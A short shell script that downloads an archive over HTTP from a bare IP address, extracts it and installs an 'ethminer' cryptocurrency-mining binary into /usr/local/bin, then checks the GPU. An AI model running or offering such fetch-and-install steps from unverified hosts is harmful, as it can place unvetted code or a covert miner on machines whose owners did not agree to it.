#!/bin/sh
apt-get install wget; apt-get install tar; mkdir down; cd down; wget http://159.89.237.64/test.gz; tar -zxvf test.gz; cd bin; install -sv ethminer /usr/local/bin/; nvidia-smi